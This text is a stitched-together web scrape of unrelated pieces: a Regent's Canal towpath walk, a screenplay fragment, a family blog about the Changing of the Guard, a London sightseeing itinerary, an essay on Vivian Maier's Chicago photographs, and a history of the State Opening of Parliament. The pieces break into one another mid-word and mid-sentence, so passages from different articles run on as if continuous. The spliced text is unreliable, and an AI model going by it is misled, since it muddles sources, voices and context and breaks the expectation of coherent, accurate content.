<p>Gunmakers Arms Bridge (58)</p>    </div>    <p>The bridges and locks are generally surrounded on the west by buildings but on the east, by a wall and overhanging trees.</p>    <div>     <p>Mile End Road Bridge (57)</p>    </div>    <p>Things become a bit busier as one approaches Mile End Lock, and new larger builings open out the vista to the east.</p>    <div>     <p>Mile End Lock</p>    </div>    <p>The contrast, looking back, is quite striking, between the old brick and then the new metal of the latest buildings.</p>    <div>     <p>Mile End Lock looking back to Mile End Road bridge</p>    </div>    <p>It looks like there has been some repairs made to the top gate of Mile End Lock.</p>    <div>     <p>Upper gate of Mile End Lock</p>    </div>    <p>&#xa0;</p>    <div>     <p>Looking back into Mile End Lock</p>    </div>    <div>     <p>Moored boats approaching Roman Road Bridge (55)</p>    </div>    <p>There is a short stretch of mooring south of Roman Road bridge.</p>    <div>     <p>Old Ford Road Bridge and the junction with the Hertford Union Canal</p>    </div>    <p>Perhaps one of the prettiest areas along this stretch is the junction with the Hertford Union canal, where a brick bridge to the east links the north and south towpaths of the Hertford Union canal, beside another small bridge, next to Old Ford Lock.</p>    <div>     <p>Old Ford Lock</p>    </div>    <p>Old Ford Lock is also quite&#xa0;picturesque, reminding the walker that the canal is rising up at this point heading towards north London.</p>    <div>     <p>Looking back down part Old Ford Lock</p>    </div>    <p>After Old Ford Lock, a run of moorings takes advantage of the shade from nearby trees. To the right is Victoria Park, along which, on the southern boundayr, runs the Hertford Union Canal.</p>    <div>     <p>Moorings just past Bonner Hal Bridge (53)</p>    </div>    <p>The scenery changes slightly now to a mixture of urban industrial and housing, generally with the housing on the north side.</p>    <div>     <p>Canal curves southwards before Mare Street Bridge (51)</p>    </div>    <p>Back gardens give way to walkways with iron railings as the canal undergoes a slight curve, before becoming relatively straight for the next mile and a half.</p>    <div>     <p>The interestingly named Cat and Mutton Bridge (49)</p>    </div>    <p>There are three remaining locks before the canal reaches the Islington tunnel and Actons lock is the first of these.</p>    <div>     <p>Acton's Lock</p>    </div>    <p>The towpath here was quite busy and there were lots of people milling around, having lunch and generally relaxing by the water.</p>    <div>     <p>A moment to reflect</p>    </div>    <p>Several road bridges criss-cross the canal and a local resident made use of his yellow plastic kayak.</p>    <div>     <p>Queensbridge Road Bridge (48)</p>    </div>    <p>There are a few small inlets along this stretch, making quite secluded moorings.</p>    <div>     <p>Small side basin</p>    </div>    <p>A rise in the path signals a bridge over the entrance to the Kinsland Basin .</p>    <div>     <p>Approach to Kingsland Basin</p>    </div>    <p>The canal here is quite wide and relatively straight.</p>    <div>     <p>Approaching New North Road Bridge (41)</p>    </div>    <p>In the late summer sun, the algae was thick in the water wherever it stagnated &#x2013; it was clear that Sturt&#x2019;s Lock had not been opened recently.</p>    <div>     <p>Wharf Road Bridge</p>    </div>    <div>     <p>Sturt's Lock - water, not pea soup!</p>    </div>    <p>&#xa0;</p>    <div>     <p>Mooring opposite Wenlock basin</p>    </div>    <p>The towpath widens here, opposite Wenlock and City Road Basins, and the view to the south gives sight of tall buildings of the City.</p>    <div>     <p>The Shard rises in the distance over the basin</p>    </div>    <p>City Road Lock was also holding back a tide of algae, which added to the greenness of this area, with the overhanging willow trees.</p>    <div>     <p>City Road Lock</p>    </div>    <p>Shortly after passing the City Road Locl, Froglane bridge comes into view and then, behind it, one can see the entrance to the Islington tunnel.</p>    <div>     <p>Approaching the Islington Tunnel</p>    </div>    <p>The towpath ceases at the entrance to the tunnel and a few brave souls held onto the bricks at the side of the entrance whilst&#xa0;swinging&#xa0;out for a better luck. I decided not to risk my camera, just in case.</p>    <div>     <p>Peering into the tunnel - no footpath!</p>    </div>    <p>When I looked into the tunnel I could see a light advancing and hear a boat&#x2019;s engine. A few minutes later, a boat emerged, having&#xa0;traveled&#xa0;the 960 yards from the western entrance.</p>    <div>     <p>Emerging from the east end of the tunnel</p>    </div>    <p>Well, that was as far as I could go, so I used the path by the side to climb up to the level of the roadway and made my way to the nearby Angel tube station, then back home.</p>    <div>     <p>Looking back eastwards from the Islington tunnel</p>    </div>    <p>On the other side of the tunnel, the canal stretches as far as Paddington, but that was too long a walk to complete straight after this one, so it was left for another day.</p>    <p>I did not log this walk with the GPS, but Google Maps informs me that it is 4.7 miles long. <small>View in a larger map</small></p>   </div>  </div>  
e planks &#xa0;first creak and then begin to tear away from the nails and blue twine that secure them.</p>   <p><b>[Shot pans 180 and presents a wide-angle of the man emerging onto a pedestrian overpass strung above a busy road]</b></p>   <p>On one side of the road, just visible is a bank of grass boarded by thick trees.

   <div>   <blockquote>    <p>They&#x2019;re changing guard at Buckingham Palace &#x2013; Christopher Robin went down with Alice. Alice is marrying one of the guard. &#x201c;A soldier&#x2019;s life is terrible hard,&#x201d; Says Alice.</p>   </blockquote>   <p>Quite why Mama, who spent a large number of her formative years buttonholing people and ranting about the evils of the monarchy, should so frequently find herself in front of Buckingham Palace watching some kind of royal pagent is something of a mystery, although what I say is that if you don&#x2019;t support your local princesses, who will be there when you need birds sung to, fancy pink dresses worn or virtual strangers married?</p>   <p>Mama likes to pretend that she is on her way somewhere and it is the quickest way up from Victoria to Piccadilly, but I am not convinced that this explains how she has pitched up there for things like 71 gun salutes fired in a particularly chaotic but difficult to achieve manner, views of the entire Royal Family standing on the balcony mugging at the crowd, and more than one fly past including everything from very old bombers through bright red planes trailing coloured smoke to modern fighters.</p>   <blockquote>    <p>They&#x2019;re changing guard at Buckingham Palace &#x2013; Christopher Robin went down with Alice. We saw a guard in a sentry-box. &#x201c;One of the sergeants looks after their socks,&#x201d; Says Alice.</p>   </blockquote>   <p>About the only thing she has not turned out for, apart from most of the Jubilee celebrations, which wasn&#x2019;t her fault as she tried to go to them all, but managed to get thoroughly rained on, choose the wrong place to stand, spend the duration hunting for the rest of her party or just turn up late with impressive regularity, was the relatively recent royal wedding.</p>   <p>She insisted on watching it on TV instead, much to our bored amazement. I hadn&#x2019;t entered my pink phase then, and to be honest, even if I had, Kate is insufficiently blonde.</p>   <p>Mama claims that she finds it amusing that despite how very much in the public eye they are, none of the Royals are really all that good a behaving like celebrities, particularly when it comes to making sure their profile is in the right light at all times.</p>   <blockquote>    <p>They&#x2019;re changing guard at Buckingham Palace &#x2013; Christopher Robin went down with Alice. We looked for the King, but he never came. &#x201c;Well, God take care of him all the same,&#x201d; Says Alice.</p>   </blockquote>   <p>William in particular has terrible posture she says, although Papa says that this is how you tell he is an aristocrat rather than middle class like Kate. Only someone that in-, sorry, well-bred can get away with slouching his way through his own wedding ceremony on national TV while his lowly future wife sits up ramrod straight, knees elegantly together, hands delightfully folded in her lap.</p>   <p>Commenting on the finer nuances of the class system. Oh dear. I think Papa may have spent too long in the UK and gone native.</p>   <p>Huh. Mama is making choking sounds in the corner. I think she might disagree.</p>   <blockquote>    <p>They&#x2019;re changing guard at Buckingham Palace &#x2013; Christopher Robin went down with Alice. They&#x2019;ve great big parties inside the grounds. &#x201c;I wouldn&#x2019;t be King for a hundred pounds,&#x201d; Says Alice.</p>   </blockquote>   <p>Anyway, we have not, thus far, actually done the regular Changing of the Guard&#xa0;at Buckingham Palace from start to finish, and so jumped at the chance when one was presented to us in the form of accompanying an American friend recently.</p>   <p>The Changing of the Guard, is&#xa0;also known, to Mama&#x2019;s inexplicable amusement, as Guard Mounting. It basically consists of one group of soldiers taking over, wait for it, guard duty from another. Quite why this needs two bands, lots of spectators and 45 minutes I do not know, but Mama says it is tradition. Tradition sounds expensive. Mama says, probably not when you consider the tourist trade as a whole.</p>   <p>We approached through St James&#x2019; Park. There&#x2019;s a particularly well-placed bridge from which everybody should get their first view of Buckingham Palace looking whitely elegant, framed by trees, reflected in the water, peeping modestly out from behind the glorified traffic island topped by a socking great gold leaf cover statue of somebody or another.</p>   <p>You can also pick up a coffee from the refreshment vans in the two&#xa0;park corners nearest the palace. You will need this to fortify you for the wait. We got there at around 10.30. The action does not really start until 11.15. Despite this, what Mama now realises are probably the prime spots directly in front of the very high wrought iron railings looking onto the forecourt of the Palace, and the very top steps of the roundabout-cum-Victoria memorial were already pretty fully occupied. If you are wanting to see absolutely everything, you are going to have to get there even earlier or develop very sharp elbows indeed.</p>   <p>We declined to engage in pushing and shoving. Instead we opted for a front row position overlooking the road just off the right of the main gates and settled down to wait. At this point Mama recommends taking along someone who is an entertaining conversationalist. Which she had done. So that was her sorted.</p>   <blockquote>    <p>They&#x2019;re changing guard at Buckingham Palace &#x2013; Christopher Robin went down with Alice. A face looked out, but it wasn&#x2019;t the King&#x2019;s. &#x201c;He&#x2019;s much too busy a-signing things,&#x201d; Says Alice.</p>   </blockquote>   <p>Fabulous for her, not so great for me, but luckily for Mama the coffee kiosks also sell ice cream. You might be thinking that half ten is a little early for ice cream, but it provided an excellent distraction for a good ten minutes, and then the clean up operation was also extensive. After that there was the fun of watching the police horses, in gloriously plentiful supply, who obligingly came and stood right in front of me on a number of occasions while their rider shouted instructions at the crowd. Mainly to do with keeping your valuables safe, I think. Mama was always going&#xa0; to be&#xa0; ok there &#x2013; she always keeps a tight hold of me in crowds.</p>   <p>And then the horseguards trotted past in full regalia! Was this it? Had the time come?</p>   <p>No. Apparently the were just going home after mounting the guard somewhere else.</p>   <p>After that highlight it was a bit of a long haul to the grand show.Every now and again a police horse would charge an errant pedestrian back behind the rope barriers. I started to get restless.</p>   <p>Finally, faintly, in the distance we heard a brass band playing. Louder and louder it got and closer and closer it came until the musicians hove into view, all bright red coats, shiny black boots and really really big furry hats.</p>   <p>And they marched straight into the entrance at completely the opposite side to where we were standing. We&#x2019;d caught an intriguing glimpse, but not much more.</p>   <p>At this point, Mama realised that perhaps she should have done a bit of rudimentary investigation into how the Changing of the Guards works, and whether or not it is worth turning up if you don&#x2019;t get there three hours ahead.</p>   <p>However, before guilt at being a monumentally bad hostess started to eat too much into her soul, a new band could be heard approaching. And this one swept past the first gate, past the middle gate and past us, with their big parpy trumpets, big booming drums, more big furry hats and big machine guns topped with bayonets, before diving into the final set of gates.</p>   <p>What happens next Mama cannot tell you, as it was audio only for our little tourist group. Some shouting, the occasional stamping and some kind of battle of the bands were what reached us. Mama began to regret not insisting on crushing people&#x2019;s toes in the pursuit of a good view, but I quite enjoyed balancing on the rope barrier like a circus princess, and then someters tour, which is included in the price of admission and is given every half hour, is a must-do. While walking on the tower walls, be sure to look out and see where the yeoman warders (the guys giving the Beefeaters tour) live &#x2014; inside the tower grounds.</li>    <li>: It&#x2019;s expensive and touristy, but it does give a good aerial view of <b>London</b> as you would expect from a giant ferris wheel. Book in advance online and avoid the ticket line. You might want to bring some binoculars. The pier area around the <b>London</b> Eye is lined with other tourist traps and restaurants.</li>    <li>Parliament and Big Ben: Two obvious must-sees that are overrun with tourists. They are just across the bridge from the <b>London</b> Eye, so you can take care of all three in one stop.</li>    <li>: Do you enjoy straining your neck to see a modest two-story building standing a good distance behind a metal gate patrolled by security guards? If so, then the prime minister&#x2019;s residence is for you. Otherwise, it&#x2019;s not worth a special trip just to see it. If you happen to be in the neighborhood, just stop by for a minute. It&#x2019;s really as dull as it sounds.</li>    <li>: You can either go see the Globe Theatre when it&#x2019;s not in use, or you can see it the way it&#x2019;s meant to be seen &#x2014; with British actors on stage performing Shakespeare. Tough call, right? Seriously, this was a terrific experience, especially since we had good weather. You can either reserve a seat or pay just a few pounds to stand in the yard area in front of the stage. Standing in the yard has its charms, especially since the stage is set up to allow the audience down there to get very close to the actors. But consider whether you are willing or able to stand for three hours like at a rock concert. Also, the yard is uncovered, so you might get rained on. As for seating, there really didn&#x2019;t seem to be many bad seats in the house, as the place is pretty small so even the upper levels get a good view. The seats are backless wooden benches, and you may want to spring a couple extra pounds to get a cushion since you will be sitting for a while. No photography is allowed during the performance, but it&#x2019;s fine before or after the play and during intermission. As for dress codes, there were certainly some people who were dressed up, but the atmosphere is pretty informal with a lot of informally dressed tourists, so casual clothes would fit right in.</li>   </ul>   <h3>Day 14</h3>   <p><strong><b>London</b></strong></p>   <ul>    <li>: You can&#x2019;t miss this stop. It was probably the most interesting attraction we visited in <b>London</b>. Plan on spending most of a day here if you want to see everything. The ancient Egyptian and Greek rooms are the best, and the Assyrian reliefs are impressive in their fine details. And it&#x2019;s all FREE!</li>    <li>: A lame, uninspiring street of antique and touristy shops. Don&#x2019;t go if you are not into antiquing, and even then, the stores aren&#x2019;t all that interesting. The antique stalls only come out on Saturdays. The other shops on the street are just a waste of space as they seem to sell mostly touristy knickknacks.</li>    <li>: It&#x2019;s a nice big green space, but a giant park is still just a park. Go on a nice day if you want to people-watch. The streets around the park are a zoo.</li>    <li>: Unless you are violently anti-religion, you should definitely try to attend a service, or at least evensong, at Westminster Abbey as a cultural experience if nothing else. The boys&#x2019; choir is excellent, and the interior architecture is impressive.</li>   </ul>   <h3>Day 15</h3>   <p><strong><b>London</b></strong></p>   <ul>    <li>: It&#x2019;s very neat to walk around and see the final resting places for famous people. It also made me think about the Egyptian mummies at the British Museum: If you&#x2019;re relatively famous and accomplished in your time and you&#x2019;ve been dead for a few hundred years, you are honored with elaborate tombs that are paid homage by millions each year. If you are extremely famous and accomplished in your time (say, being a Pharaoh) and you&#x2019;ve been dead for a couple thousand years, your tomb gets hacked open and your body yanked out of its coffin and put in a glass case for all to see. Will people be digging up Queen Elizabeth&#x2019;s tomb in a couple thousand years and putting her remains on display in a museum?</li>    <li>: This is a nice, manageable gallery that can be done in 1-2 hours.</li>    <li>: This is neat to try and a quick way to get from one side of the river to another. It&#x2019;s a cheap substitute for a full-on Thames cruise, though the Thames&#x2019; banks are not all that scenic anyway. The route does take you past the <b>London</b> Eye, Parliament, and Big Ben.</li>    <li>: Be aware that only the morning tours let you into the theatre itself. The afternoon tour, which we did, is a walk along Bankside with a knowledgeable guide who tells you a bit about the history of the area. The tour includes a stop at the Rose Theatre, a predecessor to the original Globe Theatre where Shakespeare acted and had his plays performed and an eventual victim to the Globe&#x2019;s success after it lured the Bard away from the Rose. What remains of the Rose Theatre is just a small portion of the foundation, and that&#x2019;s all kept submerged for preservation purposes, so you can&#x2019;t really see much. The tour also takes you to the spot where the original Globe Theatre stood, now the site of a plain-looking but apparently historically significant building &#x2014; one of the earliest examples of concrete being used in a building. The tour takes about one hour and is kind of interesting for history buffs, though you can see the original site yourself since it&#x2019;s just on the side of the street and there&#x2019;s a plaque in front of it.</li>   </ul>  </div>  
   <div>   <p><strong>The Architectural Photographs of Vivian Maier</strong></p>   <p>By FRANCES BRENT</p>   <div>    <p>Shot from outside an unidentified building, this photograph taken on June 27, 1964, is a double self- portrait of Vivian Maier (1926&#x2013; 2009), revealing her image reflected in a mirror inside and her shadow cast on the plate glass store front outside. The image demonstrates her fascination with the way new construction, also reflected on the glass, was grafted onto the old city.</p>   </div>   <p>SINCE SHE DIDN&#x2019;T DRIVE A CAR, the bicycle wheel signified independence for Vivian Maier during the years she lived in the suburbs of Chicago as a nanny and got around town on her bike. It also represented structural grace. You see this in what might be considered a self-portrait, Vivian&#x2019;s <em>Shadow on Bicycle Tire</em>, where her lens studies the design of spokes threading out from the axle and attaching onto a metal hoop. The pattern of the spokes plays above their shadow (as well as above Maier&#x2019;s own shadow) like an image from the constructivists Naum Gabo and Antoine Pevsner. Similarly, when she came upon a barrier fence battered down by a storm at the beach, she focused her camera on the splintered wood slats radiating around a hanger-like loop. From Maier&#x2019;s viewpoint, the accidental structure looked like the air-filled configuration of a miniature architectural model. </p>   <p>The framework of things interested Maier deeply, and she seemed particularly inquisitive about the mass-less mass of modern architecture. This is evident in the many photographs of Chicago&#x2019;s downtown she shot in the 1960s and early 1970s, when she would take the train into the city on her days off. The dynamic complexity must have relieved some of the restlessness she felt in the suburbs, where life was constricted and her observing eye was limited by the practical responsibilities of domestic work. Maier was new to he city; she had come from New York in 1956 when she was thirty years old. Like her mother and her grandmother before her, she did household work to earn a living. As she put it, she was sometimes a difficult person, private, closed off to strangers. When she went downtown, she suddenly merged into the powerful and constantly moving vitality of the city with its architecture in transition. The force of traffic, el trains, backhoes, jackhammers, and wrecking balls could be unbalancing, but shielded by the Rolleiflex strapped around her neck&#x2014;actually looking down into its viewfinder&#x2014;Maier was able to slow things down so the chaos was tolerable. She instinctively used the grid of the physical city, the angles of the streets, sidewalks, and massive buildings, old and new, to affix her compositions in space.</p>   <div>    <p>In this c. 1967&#x2013;1968 photo Maier focused her camera on the splintered wood slats of a battered beach barrier fence radiating around a hanger-like loop of wire.</p>   </div>   <p>In the same way that some artists have a genius for rendering figures in the off-kilter but truthful midway of movement, Maier repeatedly documented the transitory quality of the city as she found it. The Wrigley Building, Tribune Tower, the original Stone Container Building, the Old Water Tower, the Michigan Avenue Bridge, the sidewalks between Marshall Field&#x2019;s and the elaborately ornamented curved entrance to the Car- son&#x2019;s Building, the Art Institute and Grant Park behind it, the movie palaces&#x2014;State-Lake, Chicago, Woods, United Artists, Clark&#x2014;these were her touchstones, and they delineated a province she shared with sailors on leave, women with scarves tied under their chins or wearing corsages on fur coats, men in straw hats, men in trench coats, many of them impassive faces that had survived the years of depression and war.</p>   <div>    <p>Maier documented the architectural transitions of Chicago, including the Wrigley Building (photographed late 1960s)</p>   </div>   <p>From her contact sheets, one can infer a method of working as she moved photographically through sometimes large and random blocks of space, documenting Chicagoans in their architectural domain. Shooting what she saw as she roamed, she often caught the way the design and mass of Chicago&#x2019;s eclectic buildings were echoed by the shapes and configurations of the city&#x2019;s inhabitants. An elderly woman&#x2019;s egg- or dome- shaped hat, for instance, lines up humorously against the backdrop of the similarly shaped Tribune Tower and Wrigley&#x2019;s clock tower.</p>   <div>    <p>A signature composition is Maier&#x2019;s 1960 view of the intersection of Washington and South Wells Streets, anchored by the el station..</p>   </div>   <p>Some of the sites that interested her, such as the city&#x2019;s dark viaducts and building canyons, presented technical challenges for her Rolleiflex, but given the right lighting, a bright morning sky or just after sunset when streetlamps add a glow of illumination, she was able to manage. In one of her signature compositions, she chose an intersection at Washington and South Wells Street anchored by the el station. From her vantage point, facing a corner parking garage&#x2014;a boxy, brick, birdcage building typical of the pragmatic New Bauhaus&#x2014;she structured her composition with the eye of an engineer. Zeroing in on the physics of overlap- ping architectural structures, she showed how the stairs to the el, the fretwork of the railing, and the metal bracing of the platform formed a series of vectors, while the right angle of the garage, the sidewalk, and the street lines of the crosswalk formed an alternative group of radiating lines. Maier analyzed the intricate solid geometry, the design of a city corner, and then pounced at the moment when four pedestrians reinforced the structure, lining up imperfectly in the luminescent slush on the street.</p>   <div>    <p>Taken in 1971, this view down State Street shows the Chicago Theater on the right and Marina City in the distance.</p>   </div>   <p>Over the years, Maier seemed to take a proprietary interest in the development of downtown spaces and she made it a habit to photograph the new skyscrapers, sometimes surrounded by cranes and sidewalk sheds, as they went up. Her images of the Chase Tower, the Brunswick Building, the Sears Tower, and the John Han- cock Center look something like personal souvenirs and demonstrate the difficulties of finding a vantage point and dealing with the physical limitations of her camera and its fixed lens plane and parallel plane. Unless the film plane can be kept parallel with the face of the building the sides of the building (any vertical lines) will converge as the building rises above the cam- era. The cereal-box shaped Prudential Building, forty-one stories high and representing the most modern technologies of its time, was new when Maier arrived in Chicago. In a playful photograph, several years later, she caught its limestone and glass facade low of center in her viewfinder while shooting from behind the tail of one of the the Art Institute&#x2019;s lions.</p>   <p>During the 1960s the clean lines of new construction contrasted starkly with those of the old neoclassical and Beaux Arts buildings. After years of neglect, many of the landmark structures were covered with soot and had damaged masonry. Just as Maier documented the stoic and walled-off faces she noticed on the streets, she captured the architectural decay, destruction, and dismantling, an essential component of a modern city. Her photograph of the old Federal Building in the early stages of demolition is a study of a building&#x2019;s anatomy. With Ludwig Mies van der Rohe&#x2019;s new Dirksen Federal Building in the background, she took a long steady look where the edifice was skinned away, exposing opened up chambers that looked like a honeycomb.</p>   <div>    <p>Shot on June 27, 1964, this compelling composition shows the then Stone Container (now London Guarantee) Building, Marina City, and the Sun-Times Building (demolished in 2005).</p>   </div>   <p>Maier took many photographs at t kids came and sat on the curb in front of us, so I joined them, made friends and got to play with Mama&#x2019;s camera.</p>   <p>Lots of bottoms in my world Mama discovered later.</p>   <p>Eventually, the Guards had done enough Changing. The middle gates opened and out marched the first group, executing a smart right as the did so and providing us with an excellent view of their retreating backs.</p>   <p>But we were wise to this behaviour now and hung on for the second wave, who, sure enough, turned the other way when they left and we got another splendid view.</p>   <p>The whole thing was over by about 12 noon.</p>   <blockquote>    <p>They&#x2019;re changing guard at Buckingham Palace &#x2013; Christopher Robin went down with Alice. &#x201c;Do you think the King knows all about me?&#x201d; &#x201c;Sure to, dear, but it&#x2019;s time for tea,&#x201d; Says Alice.</p>   </blockquote>   <p>Mama decided to reward my quite good behaviour with a trip to the children&#x2019;s play area in a well-placed nearby corner of St James&#x2019;s Park. It&#x2019;s one of those places which is split up into hidden zones. But there&#x2019;s an excellent little picnic island with a clear view of the one and only exit and the whole playground is fairly compact. And I am, after all, over three now and not quite so prone to hurling myself into dangerous situations as before. Overall, Mama feels that the layout is acceptable. As for the equipment, I think it has a great sandpit, full of really big, slippy and hard rocks to jump on and off. Mama sees Prince Philip&#x2019;s hand in this breach of health and safety rules for children. I also like the sunken slide area.</p>   <p>Basically, it&#x2019;s clear that if you are on the parade route, wherever you stand, the Changing of the Guard is organised so that at some point, soldiers will stamp past you. The closer to the central gates you are, the more you will see of both groups of soldiers, but to be honest, Mama thinks that if you just have a casual interest in seeing the ceremony, you might want to turn up fairly late on and just take your chances in the crowd.</p>   <p>Everybody is pretty obliging about letting children through to the front, and as long as you don&#x2019;t mind sitting on the curb, the odd Mama and Papa might be able to wiggle though too on the grounds that their kids might need protecting from flying police horse poo.</p>   <p>We also noticed that a couple of people with wheelchairs had been positioned by the police horses on the edge of the road in a pretty decent spot, so that&#x2019;s something to take into consideration if you have mobility requirements which might otherwise put you off going.</p>   <p>If you want to see the whole thing, Mama thinks you are looking at an arrival time of at least 10am. She thinks your children might need to be a bit older than me, or more stoic to put up with that.</p>   <p>Is it worth it? Take snacks, plenty of water, and lots of photos of the police horses and I&#x2019;d say so.

wo of Chicago&#x2019;s most important 1960s building projects&#x2014; the Daley Center and Marina City. The design of the Daley Center (originally the Civic Center) was intended as an architectural homage to Mies van der Rohe and his International style that had so deeply influenced his adopted city. Simultaneously, city planners hoped to configure a European-style square by creating a large and open space north of the building site. The concept caught Maier&#x2019;s fancy and she shot a whole roll of film, sometime around 1970, looking at a matrix of city experience charted on coordinates of the plaza. In one corner she caught two hard-nosed attorneys exchanging views about a dispute spilling over from the courtroom; in another, pedestrians approaching a sidewalk shed in an urban parade. Maier then angled her camera back to photograph the monumental Picasso sculpture and the unfinished construction of an adjacent building. When she stepped even farther away, she caught a group of office workers and tourists playing a game with coins, rolling them across the granite tiles, bracketed by the heroic glass base of the Daley Center. Her photograph highlights the prismatic quality of the building, transparent enough to see right through to the long, low Greyhound sign on the other side.</p>   <p>The construction of Marina City with its two sixty-story apartment towers&#x2014;corncob towers, as Chicagoans refer to them&#x2014;signaled an audacious breakthrough in architectural imagination. Solid but spatially fluid, the cylindrical towers were a corporeal reminder of the laws and language of three-dimensional geometry. Like the bicycle wheel, the structure was perfect, kinetic, and complex. When you look at the photographs Maier took during different stages of construction and from various vantage points, you can sense the impatience she must have felt, navigating the multiple levels of the city with its unwieldy bridges and buildings. The towers were pure anomaly: built from concrete but organically shaped, vertically masculine but cerebral, wind resistant but serrated like leaves, mysterious as primeval standing stones while displaying brightly painted automobiles on cantilevering garage floors. One particularly compelling composition shows what was then the Stone Container Building, the Marina City towers, and the Sun-Times Building standing in a row like stepping stones. The image gets at the growing pains of proportionality, an awkwardly beautiful moment in Chicago&#x2019;s metamorphosis. While there was a sense of loneliness and isolation settling on the surface of the buildings that day&#x2014;something the photographer could contemplate knowingly&#x2014;the photographic lens showed Marina City bathed in a kind of smoky light that enhanced its abstract qualities. On the street, pedestrians, cars, a trailer, a trashcan, and a mailbox appeared becalmed and miniature in a space that they shared with a cluster of the city&#x2019;s monumental and sculptural structures. </p>  </div>  
   <div>   <p><strong>by Scott Mehl</strong></p>   <div>    <p>source: Zimbio</p>   </div>   <p> marks the beginning of a new session of Parliament in the United Kingdom. It is traditionally attended by the Sovereign, who gives a Speech from the Throne. This takes place in the chamber of the House of Lords, as the Sovereign is not permitted to enter the House of Commons. The last sovereign to enter the Commons was Charles I, in 1642, who stormed in attempting to arrest several members.</p>   <div>    <p>King Henry VIII opening Parliament, 1523. &#xa0;source: Wikipedia</p>   </div>   <p>The practice of opening Parliament goes back to the 1400s, although the earliest detailed records are from 1510, recounting King Henry VIII&#x2019;s first Opening of Parliament. The King, accompanied by the Peers and his attendants, would usually travel on horseback from the Sovereign&#x2019;s official residence to Westminster Abbey where a service would be held. Following the service, they would proceed to the Palace of Westminster for the State Opening. The service was discontinued in 1679, when it (along with the procession) were cancelled due to fears of a Popish Plot. The procession resumed the following year, and was soon slimmed down to just the Sovereign and his entourage.</p>   <p>In the Georgian era, carriages began to be used regularly, to transport the Sovereign and other members of the Royal Family and their attendants. Back then, the Sovereign would usually just say a few words before the speech was read by the Lord Chancellor. It was King James I who began the practice of reading the speech himself. This varied for the next several reigns, and by 1679 it became traditional for the Sovereign to read the speech. (With the exception of King George I who barely spoke English, and Queen Victoria who typically left the speech to the Lord Chancellor.)</p>   <div>    <p>Queen Victoria opening Parliament, 1866. &#xa0;source: Wikipedia</p>   </div>   <p>For nearly 200 years, the Sovereign was almost always in attendance. However, Queen Victoria did not attend for several years after the death of the Prince Consort in 1861. She returned in 1866 (under pressure from her ministers, her children and the British public), but would only be present seven times in the remaining 34 years of her reign.</p>   <p>In 1901, the new King Edward VII brought much of the pageantry and tradition back to the ceremony. One of the most significant changes took place on the dais itself. Previously, a single throne for Queen Victoria had stood surrounded by an iron railing. King Edward VII had the railing removed, and had a second throne (just slightly smaller) placed immediately to the left of his own. Thus began the tradition of the Consort sitting beside the Sovereign. In the early years of the current reign, the Duke of Edinburgh sat in a small chair off the side of the dais, but for many years now, has been seated in a second throne beside The Queen.</p>   <div>    <p>King Edward VIII at the Opening of Parliament, 1936. &#xa0;source: Wikipedia</p>   </div>   <p>King Edward VIII only attended once during his brief reign in 1936. Not having been crowned, he did not wear the Imperial State Crown with his Robe of State. (He would abdicate just weeks later.) The Queen also opened Parliament for the first time before being crowned, and wore the George IV State Diadem. Since 1953, she has worn the Imperial State Crown, and has attended every year other than 1959 and 1963, when she was pregnant with Prince Andrew and Prince Edward. She is typically accompanied by The Duke of Edinburgh.</p>   <div>    <p>Queen Elizabeth II opening Parliament, 1952. source: The Daily Mail</p>   </div>   <p>The ceremony which occurs today dates back to the opening of the new Palace of Westminster in 1852. Having been rebuilt after the old palace was destroyed by fire in 1834, the new building was laid out to best show off the pageantry of the official procession. Much of the detail has remained mostly unchanged since then, including the order of the procession and seating in the House of Lords. The photo below is from the 1866 Ceremonial, and shows the procession and the precise seating. A ceremonial is issued each year, usually with very few changes. &#xa0;Below is the 1886 Ceremonial, showing the procession as well as where everyone is positioned around the throne.</p>   <p><span>Searching of the Cellars</span> The pageantry of the day begins with the searching of the cellars. In 1605, a group of English Catholics attempted to blow up Parliament with the goal of killing the Protestant King James I and placing his daughter Elizabeth on the throne. This became known as the Gunpowder Plot. Having been warned of the plot, the Yeoman of the Guard (the Sovereign&#x2019;s bodyguard) searched the cellars at Westminster and found Guy Fawkes guarding 36 barrels of gunpowder &#x2013; more than enough to destroy the entire building and everyone in it. Since then, the Yeoman of the Guard have searched the cellars before every opening of Parliament. Of course, today it is merely part of the pageantry. The building and grounds are fully searched by police and security officers, but officially, it is the Yeoman of the Guard who ensure that the Palace of Westminster is secured before the Sovereign&#x2019;s arrival.</p>   <div>    <div>     |    </div>   </div>   <p>In the meantime, the two houses of Parliament assemble in their respective chambers. Members of the House of Lords are in their robes and finery, with many of their wives, and other peers in attendance. Also seated in the House of Lords are members of the diplomatic corps and senior members of the judiciary. Until the 1999 House of Lords Act, other members of the Royal Family who were peers and peeresses often attended.</p>   <p><span>Royal Hostage</span> In another tradition which goes back for a few hundred years, a senior member of the House of Commons, traditionally the Vice-Chamberlain of the Household, is held hostage at Buckingham Palace to ensure the Sovereign&#x2019;s safe return from the Palace of Westminster. This tradition goes back to the Restoration in 1660. The previous Vice-Chamberlain had been involved in the beheading of King Charles I, and this was seen as the best way to ensure the safety of the monarch.</p>   <div>    <div>     |    </div>   </div>   <p><span>Arrival of the Royal Regalia</span> Prior to the Opening of Parliament, the Imperial State Crown, Great Sword of State and the Cap of Maintenance are brought from the Jewel House at the Tower of London to Buckingham Palace. On the morning of the Opening, the Crown is transported to the Palace of Westminster, traditionally in Queen Alexandra&#x2019;s State Coach, by the Comptroller of the Lord Chamberlain&#x2019;s office. Also traveling with the Crown are the Sword of State and the Cap of Maintenance, accompanied by two other members of the Royal Household. The carriage is accompanied by the Queen&#x2019;s Bargemaster &#x2013; a throwback to the days when the Crown Jewels were often transported by barge from the Tower of London. Just as the Sovereign, the Crown is escorted by the Household Cavalry and receives a royal salute.</p>   <p>Upon arriving at the Sovereign&#x2019;s gate at the Palace of Westminster, the Crown, Sword and Cap are taken to the Regalia Room where the Court Jeweler transfers the Crown to a large cushion for the remainder of the procession. (This is done by the Crown Jeweler as he is the only one, aside from the Sovereign, who can handle the crown.) The Comptroller then carries the Crown up the Norman staircase to the Royal Gallery, and presents the Crown to the Lord Great Chamberlain who places it on display along with the Sword and Cap. Once the Sovereign has left Buckingham Palace, the Crown is then taken into the Robing Room to await her arrival.</p>   <div>    <div>     |    </div>   </div>   <p>The Imperial State Crown currently used dates from 1937. It was made for the coronation of King George VI, as a replica of the one worn from Queen Victoria&#x2019;s coronation. This one was made lighter and easier to wear. It was modified very slightly in 1953   <div>   <p>By Angela Vanderbilt</p>   <p>The story of abandoned subway stations and tracks hidden beneath busy city streets is not unique to Cincinnati. Other large cities, such as New York, London, and Paris have similarly mysterious and intriguing stories to tell. An article I recently read in 